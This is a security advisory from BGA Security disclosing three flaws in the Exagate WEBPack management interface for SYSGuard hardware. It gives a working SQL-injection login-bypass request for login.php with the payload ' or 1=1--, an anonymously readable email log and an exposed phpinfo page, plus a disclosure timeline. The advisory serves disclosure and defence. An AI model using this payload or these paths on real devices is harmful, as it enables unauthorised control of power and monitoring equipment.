@@ -1,0 +1,100 @@
+Document Title:
+================
+Exagate WEBpack Management System Multiple Vulnerabilities
+
+Author:
+========
+Halil Dalabasmaz
+
+Release Date:
+==============
+07 OCT 2016
+
+Product & Service Introduction:
+================================
+WEBPack is the individual built-in user-friendly and skilled web
+interface allowing web-based access to the main units of the SYSGuard
+and POWERGuard series. The advanced software enables the users to
+design their customized dashboard smoothly for a detailed monitoring
+and management of all the power outlet sockets & sensor and volt free
+contact ports, as well as relay outputs. User definition and authorization,
+remote access and update, detailed reporting and archiving are among the
+many features.
+ 
+Vendor Homepage:
+=================
+http://www.exagate.com/
+
+Vulnerability Information:
+===========================
+Exagate company uses WEBPack Management System software on the hardware.
+The software is web-based and it is provide control on the hardware. There are
+multiple vulnerabilities on that software.
+
+Vulnerability #1: SQL Injection
+================================
+
+There is no any filtering or validation mechanisim on "login.php". "username"
+and "password" inputs are vulnerable to SQL Injection attacks. Sample POST
+request is given below.
+
+POST /login.php HTTP/1.1
+Host: <TARGET HOST>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+
+username=root&password=' or 1=1--
+
+Vulnerability #2: Unauthorized Access To Sensetive Information
+===============================================================
+
+The software is capable of sending e-mail to system admins. But there is no
+any authorization mechanism to access e-mail logs. The e-mail logs can accessable
+anonymously from "http://<TARGET HOST>/emaillog.txt".
+
+Vulnerability #3: Unremoved Configuration Files
+================================================
+
+The software contains the PHP Info file on the following URL.
+
+http://<TARGET HOST>/api/phpinfo.php
+
+Vulnerability Disclosure Timeline:
+==================================
+03 OCT 2016 - 	Attempted to contact vendor after discovery of vulnerabilities
+06 OCT 2016 - 	No response from vendor and re-attempted to contact vendor
+07 OCT 2016 - 	No response from vendor
+07 OCT 2016 - 	Public Disclosure
+ 
+Discovery Status:
+==================
+Published
+ 
+Affected Product(s):
+=====================
+Exagate SYSGuard 3001 (Most probably all Exagate hardwares affected that vulnerabilities)
+
+Tested On:
+===========
+Exagate SYSGuard 3001
+
+Disclaimer & Information:
+==========================
+The information provided in this advisory is provided as it is without 
+any warranty. BGA disclaims all  warranties, either expressed or implied,
+including the warranties of merchantability and capability for a particular
+purpose. BGA or its suppliers are not liable in any case of damage, including
+direct, indirect, incidental, consequential loss of business profits or
+special damages.
+  
+Domain:     www.bgasecurity.com
+Social:     twitter.com/bgasecurity
+Contact:    advisory@bga.com.tr
+
+Copyright © 2016 | BGA Security LLC
